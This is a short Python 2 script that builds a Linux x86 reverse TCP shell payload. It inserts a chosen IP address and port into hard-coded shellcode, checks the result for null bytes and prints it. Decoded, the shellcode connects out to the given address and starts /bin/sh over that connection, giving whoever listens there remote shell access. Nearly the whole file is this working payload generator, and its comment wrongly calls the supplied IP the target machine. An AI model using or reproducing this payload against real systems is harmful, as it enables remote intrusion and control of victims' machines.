#!/usr/bin/python

print 'Usage: ./wrapper.py <ip-address> <port-no>' + '\n'
print 'Kindly use port greater than 1024' + '\n'

import sys

shellcode =  "\x29\xc0\x29\xdb\x99\xfe\xc3\x50\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80"
shellcode += "\x89\xc6\x68\x0a\x0a\x02\x80\x66\x68\x04\xd2\xfe\xc3\x66\x53\x89\xe1" 
shellcode += "\x6a\x10\x51\x56\xb0\x66\xfe\xc3\x89\xe1\xcd\x80\x29\xc9\xb0\x3f\x89" 
shellcode += "\xf3\x80\xf9\x01\xcd\x80\xfe\xc1\x79\xf3\xb0\x0b\x52\x68\x2f\x2f\x73" 
shellcode += "\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xd1\xcd\x80"

shellcode1 = []
IP = []
flag=20
ptr = 0

ip = sys.argv[1]	#IP of target machine
port = int(sys.argv[2]) #Port no

ip1 = ip.split('.')
for i in ip1:
	IP.append(int(i))	

port = hex(port)		

encoded=""

for i in bytearray(shellcode):
	shellcode1.append(i)

for i in IP:
	shellcode1[flag] = i
	flag += 1	

if len(port[2:]) == 3:
	b1 = port[2:][1:]
	b2 = port[2:][:1]

	s1 = int(b2 , 16)
	s2 = int(b1 , 16)

	shellcode1[26] = s1
	shellcode1[27] = s2

else:
	b1 = port[2:][2:]
	b2 = port[2:][:2]

	s1 = int(b2 , 16)
	s2 = int(b1 , 16)

	shellcode1[26] = s1
	shellcode1[27] = s2

for i in bytearray(shellcode1):
	ptr += 1
	if i != 0:
		encoded += "\\x"
		encoded += "%02x" %i
	else:
		print 'Shellcode has null byte at:%d' %ptr
		break

print '\"' + encoded + '\"' + '\n' 
